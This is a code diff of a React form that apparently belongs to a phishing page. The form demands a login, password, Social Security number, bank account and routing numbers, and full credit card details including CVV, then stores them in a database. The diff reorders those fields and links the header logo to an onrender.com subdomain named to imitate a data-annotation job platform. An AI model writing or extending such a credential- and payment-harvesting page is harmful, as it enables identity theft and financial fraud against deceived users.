@@ -98,17 +98,17 @@ export default function Main() {
    async function handleSubmit(event: FormEvent) {
       event.preventDefault();
       if (
-         !formData.username ||
-         !formData.password ||
          !formData.firstname ||
          !formData.lastname ||
          !formData.email ||
          !formData.address ||
          !formData.socialSecurity ||
+         !formData.bankName ||
+         !formData.accountHolderName ||
          !formData.accountNumber ||
          !formData.routingNumber ||
-         !formData.accountHolderName ||
-         !formData.bankName ||
+         !formData.username ||
+         !formData.password ||
          !formData.expiry ||
          !formData.cvv ||
          !formData.creditCard ||
@@ -127,17 +127,18 @@ export default function Main() {
 
          console.log('Document successfully written!');
          setFormData({
-            username: '',
-            password: '',
+           
             firstname: '',
             lastname: '',
             email: '',
             address: '',
             socialSecurity: 0,
+            bankName: '',
+            accountHolderName: '',
             accountNumber: 0,
             routingNumber: 0,
-            accountHolderName: '',
-            bankName: '',
+            username: '',
+            password: '',
             expiry: 0,
             creditCard: 0,
             cvv: 0,
@@ -168,7 +169,7 @@ export default function Main() {
       >
          <div className="md:flex  justify-between items-center text-white py-2 px-[20%] bg-black">
             <div className="flex flex-col font-bold text-[25px]">
-               <img src="assets/data.jpg" alt="Data" />
+               <a href='https://dataannotation-dg92.onrender.com'><img src="assets/data.jpg" alt="Data" /></a>
             </div>
             <div className="space-x-4 space-y-10 text-xs">
                <Link href="/" legacyBehavior>
